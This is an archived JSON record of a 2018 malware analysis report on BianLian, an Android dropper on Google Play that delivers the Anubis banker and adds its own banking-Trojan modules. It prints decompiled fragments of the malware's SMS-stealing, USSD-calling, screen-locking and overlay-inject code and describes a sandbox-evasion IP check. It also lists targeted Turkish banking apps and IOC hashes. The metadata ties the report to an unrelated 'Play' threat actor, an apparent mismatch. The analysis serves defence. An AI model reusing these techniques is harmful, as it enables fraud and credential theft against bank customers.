{
    "id": "31570274-2031-421e-b99c-8cf5cae756cd",
    "created_at": "2023-01-12T15:03:34.582195Z",
    "updated_at": "2025-03-27T02:16:25.600987Z",
    "deleted_at": null,
    "sha1_hash": "c10cf83310737abd4bae415e13474f76f19b6807",
    "title": "2018-10-01 - BianLian - The Malware Dropper That Had A Dream",
    "authors": "",
    "file_creation_date": "2022-05-28T23:38:41Z",
    "file_modification_date": "2022-05-28T23:38:41Z",
    "file_size": 2516808,
    "plain_text": "# BianLian - from rags to riches, the malware dropper that had a dream\n\n**[threatfabric.com/blogs/bianlian_from_rags_to_riches_the_malware_dropper_that_had_a_dream.html](https://www.threatfabric.com/blogs/bianlian_from_rags_to_riches_the_malware_dropper_that_had_a_dream.html)**\n\nOctober 2018\n\n\n-----\n\n## Intro\n\nRecently, while analyzing our daily portion of APK files, searching for the new banking\nrelated threats, we found a sample that was standing out among the others. While being\nseemingly benign, the sample was downloading and installing the infamous Anubis malware,\nwhich is responsible for financial losses of thousands of Android users around the globe,\ntargeting more than 300 different apps.\n\nThe thorough investigation of this sample led us to uncover yet another malware dropper\ncampaign on the Google Play store - the main source of the applications for the vast majority\nof the Android users. The actors have managed to bypass the Play store protections on a\nregular basis, the first sample that we were able to attribute to this campaign was built and\nuploaded to the store in the July 2018 and most recent one – on October 16th, so the\ncampaign is active for at least 3 months now:\n\nAs visible in the following chart, several different droppers were built through time, on quite a\nregular basis:\n\n\n-----\n\nThe samples from the campaign were mutating with time, that is a common approach to\nevade detection of Play Protect security systems and AVs. But the last mutations were quite\nunexpected: the dropper, while still dropping Anubis, was on the way of becoming a fullblown banking Trojan itself.\n\nThe sample built on 15 October, shown in here-above in green, is the only one with the full\nset of mutations, making it a banking Trojan. This particular sample at the moment has not\nreceived commands to drop Anubis APKs.\n\nWe dubbed this malware BianLian as reference to the Chinese theatrical art of changing\nfrom one face to another almost instantaneously.\n\n_VirusTotal detections rate for BianLian_\n\n## Overview of the dropper\n\nThe dropper/malware was masquerading itself as simple applications that are always in\ndemand, such as currency/rates calculators, device cleaners and even discounter Apps. To\nensure that malware would stay on the victims’ device as long as possible, those\n\n\n-----\n\napplications were actually working and even had a good rating in the Google Play store.\n\n_BianLian in the Play store_\n\nOne version of this malware dropper used the trick mentioned in the - the icon and name on\nthe Play Store are different from name and the icon on the Home screen:\n\n\n-----\n\n_Different icons and names on the Play Store and Home screen_\n\nThe dropper itself had a modular architecture from the start, but only “Installs” module was\npresent in all samples, except for the two most recent ones in which more modules were\npresent. The module is responsible for downloading and launching the installation of the APK\nfile(belonging to the Anubis banker) from the external server and, optionally, hiding the app’s\n[icon from the Home screen. The malware author uses the Firebase Messaging service to](https://firebase.google.com/docs/cloud-messaging/)\ndeliver the command to modules.\n\nThe dropper sets some properties based on the configuration that is embedded in the code\n(the date when it will become active, c2 url, debug flag etc), then it will decrypt and load the\nDEX file from assets.\n\nAfter this it will trigger an initialisation routine – loads all enabled components, registers with\nC2, checks which public IP it uses, sets the implementation for the Firebase and Google\nCloud Messaging services. After this it schedules a periodic task using the GCM and starts\naccepting commands for components via Firebase.\n\nThe diagram below shows how the malware works step by step:\n\n\n-----\n\nOne interesting question remains – how are cyber-criminals able to successfully upload the\nmalware to the Play store and remain undetected for some time?\n\nBased on our analysis, we can assume that the combination of the following techniques\nhelped them to achieve that goal:\n\nPayload hiding: the actual payload for the dropper is encrypted and stored in assets.\nThe sample accesses it, decrypts it and loads using the DexClassLoader\nTimeouts: every sample has a date when it will become active. So, during the security\nchecks, the dropper will work as a regular application\n\n\n-----\n\nIP checks: samples use external service, http://ip-api.com/json, to check if it is running\ninside Google network. The service returns JSON that looks like this:\n```\n   {\n     \"as\": \"\",\n     \"city\": \"\",\n     \"country\": \"\",\n     \"countryCode\": \"US\",\n     \"isp\": \"\",\n     \"lat\":,\n     \"lon\":,\n     \"org\": \"Google\",\n     \"query\": \"\",\n     \"region\": \"\",\n     \"regionName\": \"\",\n     \"status\": \"success\",\n     \"timezone\": \"\",\n     \"zip\": \"5644\"\n   }\n\n```\nIf the “countryCode” is set to “US” and the “org” is set to “Google” there will be no\ncommunication between the Trojan and the C&C server as it considers being analyzed by\nthe Google security services.\n\n## Evolution from dropper to malware\n\n### The components\n\nIn the last three samples of the malware there are some new components in the code, in\naddition to the “Installs” component. The first two are not using those new modules, the\nsamples are pre-configured to use only “Installs”, but the last one,\n4cc68830a108b03171c01e0b0f42d5257982c51f3e39bbe7a3b712a7e4baa256, have those\nmodules enabled.\n\nThe code snippet shows the list of components:\n\n\n-----\n\n```\nprivate List getComponents(Context arg4) {\n       ArrayList v1 = new ArrayList();\n       Object v0 = SdkProperties.getProperty(\"components\");\n       if(!SdkBuilder.$assertionsDisabled && v0 == null) {\n         throw new AssertionError();\n       }\n       if(((String)v0).contains(\"text\")) {\n         ((List)v1).add(new TextComponent());\n       }\n       if(((String)v0).contains(\"ussd\")) {\n         ((List)v1).add(new UssdComponent());\n       }\n       if(((String)v0).contains(\"locker\")) {\n         ((List)v1).add(new LockerComponent());\n       }\n       if(((String)v0).contains(\"injects\")) {\n       ((List)v1).add(new InjComponentBuilderImpl().withContext(arg4).build());\n       }\n       if(((String)v0).contains(\"installs\")) {\n         ((List)v1).add(new InstallsComponent());\n       }\n       ((List)v1).add(new CountryCodeComponent());\n       return ((List)v1);\n   }\n   public void onCreate() {\n       super.onCreate();\n       if(!MyApp.useFullVersion) {\n        return;\n       }\n       SdkProperties.setProperty(\"unlockDate\", \"16-10-2018 12-00\");\n       SdkProperties.setProperty(\"debugMode\", Boolean.valueOf(false));\n       SdkProperties.setProperty(\"baseUrl\", this.getString(0x7F0B003B));\n       SdkProperties.setProperty(\"launcherActivity\", MainActivity.class);\n     SdkProperties.setProperty(\"components\", \"installs, text, ussd, locker, inject\n       new MyApp$Helper(this, ((Application)this));\n   }\n\n### Text module\n\n```\nThis module is able to send the text messages with given text to arbitrary numbers and also\nto steal the incoming text messages.This functionality can be used to abuse SMS banking, to\nsubscribe the for the paid services and to steal OTP authentication codes sent to the device.\n\n\n-----\n\n```\npublic void onFcmMessageReceived(String arg6, Bundle arg7) {\n      if(\"sms\".equals(arg6)) {\n        String v2 = arg7.getString(\"id\");\n        String v1 = arg7.getString(\"phone_number\");\n        this.onSmsComeToSend(v2, v1, arg7.getString(\"text\"));\n      }\n  }\n  private void onSmsComeToSend(String arg7, String arg8, String arg9) {\n      String v2 = null;\n    if(!TextUtils.isEmpty(((CharSequence)arg8)) && !TextUtils.isEmpty(((CharSequen\n      SmsManager.getDefault().sendTextMessage(arg8, v2, arg9, ((PendingIntent)v2\n        this.onSmsWasSent(arg7);\n      }\n  }\n  public void onSmsReceived(String arg5, String arg6) {\n      if(arg6 != null) {\n        HashMap v0 = new HashMap();\n        ((Map)v0).put(\"phone_number\", arg5);\n        ((Map)v0).put(\"text\", arg6);\n        SdkApi v1 = this.api();\n        v1.makePost(\"device/sms\", ((Map)v0)).enqueue(new CallbackText(this));\n      }\n  }\n\n### USSD module\n\n```\nThis module is able to run arbitrary USSD codes (or to make phone calls). The USSD codes\ncan be used to check the sim card balance:\n\n\n-----\n\n```\n  private void launchUssdCode(Context arg6, String arg7) {\n         Timber.d(\"log -> \\[%s\\]\", new Object\\[\\]{arg7});\n         arg7 = arg7.replaceAll(\"#\", Uri.encode(\"#\"););\n         StringBuilder v2 = new StringBuilder();\n         v2.append(\"tel\").append(\":\").append(arg7).toString();\n         Intent v0 = new Intent(\"android.intent.action.CALL\", Uri.parse(v2));\n         v0.addFlags(0x10000000);\n         v0.addFlags(0x20000000);\n         arg6.startActivity(v0);\n     }\n     private void onUssdCodeReceived(String arg7, String arg8) {\n         Timber.d(\"log -> 1\\[%s\\], 2\\[%s\\]\", new Object\\[\\]{arg7, arg8});\n         try {\n           this.launchUssdCode(this.context(), arg8);\n           HashMap v1 = new HashMap();\n           ((Map)v1).put(\"id\", arg7);\n           SdkApi v2 = this.api();\n           v2.makePost(\"device/ussdrun\", ((Map)v1)).enqueue(new CallbackUSSD(this));\n         }\n         catch(Exception v0) {\n           Timber.e(((Throwable)v0), \"code received\", new Object\\[0\\]);\n         }\n     }\n\n### Locker module\n\n```\nThis is module is able to lock the device screen. Although this functionality can be used to\nask user for the ransom, at the moment it is used to just prevent any user interaction with the\ndevice for a period of time (for example to hide from the victim when the malware makes a\nphone call).\n\n\n-----\n\n```\n  public class Const {\n      private static final Map stringsMapEn;\n      private static final Map stringsMapTr;\n      static {\n        Const.stringsMapEn = new HashMap();\n        Const.stringsMapTr = new HashMap();\n    Const.stringsMapEn.put(\"locker\\_info\\_text_finished\", \"All data successfully r\n    Const.stringsMapEn.put(\"locker\\_header\\_text\", \"Android system corrupted files\n    Const.stringsMapEn.put(\"locker\\_info\\_text\", \"SYSTEM STATUS: Official\\\\nKNOX K\n    Const.stringsMapTr.put(\"locker\\_info\\_text_finished\", \"TÜM VERİLER BAŞARIYLA G\n    Const.stringsMapTr.put(\"locker\\_header\\_text\", \"Android Sistemi bozuk dosyalar\n    Const.stringsMapTr.put(\"locker\\_info\\_text\", \"SİSTEM DURUMU: Resmi\\\\nKNOX KERN\n      }\n      public Const() {\n        super();\n      }\n      public static String getString(Context arg5, String arg6) {\n        boolean v2;\n        try {\n      v2 = Locale.getDefault().getCountry().toLowerCase().contains(\"tr\");\n        }\n        catch(Exception v0) {\n          v0.printStackTrace();\n        }\n    Object v3 = v2 ? Const.stringsMapTr.get(arg6) : Const.stringsMapEn.get(arg6);\n        return ((String)v3);\n      }\n    }\n\n### Injects module\n\n```\nThis module is able to show push notifications and to perform overlay attacks. It uses the\n[AndroidProcesses to get the foreground application (this technique will not work for Android](https://github.com/jaredrummler/AndroidProcesses/tree/master/library/src/main)\nversions above 7).\n\n\n-----\n\n```\n  public void onDeviceRegistered() {\n         HashMap v0 = new HashMap();\n         ((Map)v0).put(\"app_list\", this.getInstalledApps());\n         SdkApi v1 = this.api();\n         v1.makePost(\"device\", ((Map)v0)).enqueue(new CallBackInject(this));\n     }\n     public void onFcmMessageReceived(String arg10, Bundle arg11) {\n         Timber.d(\"onFcmMessageReceived > type = %s, payload = %s\", new Object\\[\\]{arg10, arg11});\n         if(\"TEST_NOTIFICATION\".equals(arg10)) {\n       this.onNotificationReceived(new NotificationModel(\"1\", \"com.binance.dev\",\n         }\n         else {\n           if(arg10.equals(\"notification\")) {\n             String v1 = arg11.getString(\"notification\");\n             if(v1 != null) {\n               JsonElement v2 = new JsonParser().parse(v1);\n               if(v2 != null) {\n             NotificationModel v3 = this.parseModel(v2.getAsJsonObject());\n                 if(v3 != null) {\n                   this.onNotificationReceived(v3);\n                 }\n               }\n             }\n           }\n           else {\n             if(arg10.equals(\"request_credentials\")) {\n           this.configsProvider.getInjectHandler().setInjectWasShowed(arg11.\n             }\n           }\n         }\n     }\n\n```\nHere are the examples of phishing interfaces used to perform credentials stealing:\n\n\n-----\n\n## Overlay targets\n\nThe injects are stored in the encrypted ZIP file in the assets folder and cannot be\ndynamically changed. Below is the list of package names related to the Apps targeted by\nBianLian:\n\n**Package name** **App name**\n\ncom.binance.dev Binance - Cryptocurrency Exchange\n\ncom.akbank.android.apps.akbank_direkt Akbank Direkt\n\ncom.akbank.android.apps.akbank_direkt_tablet_20 Akbank Direkt\n\ncom.akbank.android.apps.akbank_direkt Akbank Direkt\n\n\n-----\n\n**Package name** **App name**\n\ncom.btcturk BtcTurk Bitcoin Borsası\n\ncom.finansbank.mobile.cepsube QNB Finansbank Cep Şubesi\n\ncom.garanti.cepsubesi Garanti Mobile Banking\n\ncom.garanti.cepsubesi_20 Garanti Mobile Banking\n\ncom.garanti.cepsubesi Garanti Mobile Banking\n\ncom.htsu.hsbcpersonalbanking HSBC Mobile Banking\n\ncom.ingbanktr.ingmobil ING Mobil\n\ncom.kuveytturk.mobil Mobil Şube\n\ncom.magiclick.odeabank Odeabank\n\ncom.pozitron.albarakaturk Albaraka Mobil Şube\n\ncom.pozitron.vakifbank VakıfBank Cep Şifre\n\ncom.pozitron.iscep İşCep\n\ncom.teb CEPTETEB\n\ncom.tmob.denizbank MobilDeniz\n\ncom.tmob.tabletd> MobilDeniz Tablet\n\ncom.tmob.denizbank MobilDeniz\n\ncom.vakifbank.mobile VakıfBank Mobil Bankacılık\n\ncom.ykb.android Yapı Kredi Mobile\n\ncom.ykb.androidtablet Yapı Kredi Mobil Şube\n\ncom.ykb.android Yapı Kredi Mobile\n\nfinansbank.enpara Enpara.com Cepubesi\n\ntr.com.sekerbilisim.mbank ŞEKER MOBİL ŞUBE\n\ncom.ziraat.ziraatmobil Ziraat Mobil\n\ncom.tmobtech.halkbank Halkbank Mobil\n\n## Conclusion\n\n\n-----\n\nThis particular story of the new malware evolution shows that malware authors are always\neager to explore new ways to maximize their profits. After establishing a way to regularly\nupload the droppers to the Play Store, it was a reasonable move for the malware author to\nwork on adding new features to the Trojan, while still providing dropper service to the Anubis\nactors. We have seen only one version of the dropper with the new modules enabled, and\nthere is a newer variant with the disabled modules, so we assume that the actor behind it is\nstill testing his setup.\n\nWe can imagine two possible ways for this story to develop: 1) The dropper authors still see\nan important source of revenue in dropping the Anubis malware and will have both malware\nrunning side by side on the infected devices 2) There is no honor among thieves and the\ndropper author decide to pursue his own career in banking malware and therefore stop\ndropping the Anubis malware, which we believe to be the most realistic option. 3) It is also\npossible that the actor was just renting the Anubis Trojan while he was building his own\nmalware, and when this will be done, he will stop using the rented Anubis\n\nOnly time will tell us what path the actors will go.\n\n## Mobile Threat Intelligence\n\nOur threat intelligence solution – MTI, provides the context and in-depth knowledge of the\npast and present malware-powered threats in order to understand the future of the threat\nlandscape. Such intelligence, includes both the strategic overview on trends and the\noperational indicators to discern early signals of upcoming threats and build a future-proof\nsecurity strategy.\n\n## Client Side Detection\n\nOur online fraud detection solution – CSD, presents financial institutions with the real-time\noverview on the risk status of their online channels and related devices. This overview\nprovides all the relevant information and context to act upon threats before they turn into\nfraud. The connectivity with existing risk or fraud engines allows for automated and\norchestrated, round the clock fraud mitigation.\n\n## IOC\n\n\n-----\n\n```\nCanlı Döviz Takip & Çevir (com.ganatolii.android.apps)\nb2398fea148fbcab0beb8072abf47114f7dbbccd589f88ace6e33e2935d1c582\nDöviz ve Altın Kurları (com.yktop.android.apps)\n4cc68830a108b03171c01e0b0f42d5257982c51f3e39bbe7a3b712a7e4baa256\nGoogle Protect (Services) / Wechselkurse in Echtzet (com.antonsilin.android.apps)\nf877c8e7d0e4efc2e583ecf0fcfe6e2470c23adf61f65b88e38042534ed77ddf\nDövizmerkezi (com.neliseev.android.app)\n1096915523dbf1aa5b4b9269da5b6a3567d257d62b0bd6328c369c27d6ef6e76\nGucci Outlet & Sale (com.onid.gucciapp.android)\n3059e9ba1a6d2b17b40ad03ea507c3eddd3ea4fb2a45983a6763de9cff8ae8c4\nWährungsrechner (com.belovtimam.creative.studio)\n0d0fc1ed4798e6c85ab7d693cc980f252d9b30d6d5acbbcab2e99bf7977f3c02\nPhoneCleaner App (com.marin.adackova.cleaner)\na39b93b5e51521541de8df6f8965247ca7fbe628cae4a9e4cbf54cec508296a5\nDevice Cleaner (com.cvetk.cleaner.android)\nc61da78ce2caf452196bdfc7d1e8f69a8b8ffc2ff316e4eb78ad92231f719d36\nCurrency Rates (com.brianwillis.devteam.android)\na8aaf028e6e17886b22381a5a94d5a34c8e6848227b31edfa2855a603ba797ce\nRates App (com.link.devsteams.android)\na6e1b96156c8e2e3998af1c2a693a06f26d99eb6d2f7255abc7b34171ea8edc4\nCrypto Rates LiveApp (com.rcrypt.panov.dev.android)\n54db80da9b3b9137f61d3e844686ee1a675eb1d6dae9b0366cad5300c2767da3\n\n## Special thanks\n\n```\n[A special thanks to the AVAST team and their APKLAB platform, which allowed us to search](https://apklab.io/)\nfor additional samples.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-10-01 - BianLian - The Malware Dropper That Had A Dream.pdf"
    ],
    "report_names": [
        "2018-10-01 - BianLian - The Malware Dropper That Had A Dream.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535814,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653781121,
    "ts_modification_date": 1653781121,
    "files": {
        "pdf": "https://archive.orkl.eu/c10cf83310737abd4bae415e13474f76f19b6807.pdf",
        "text": "https://archive.orkl.eu/c10cf83310737abd4bae415e13474f76f19b6807.txt",
        "img": "https://archive.orkl.eu/c10cf83310737abd4bae415e13474f76f19b6807.jpg"
    }
}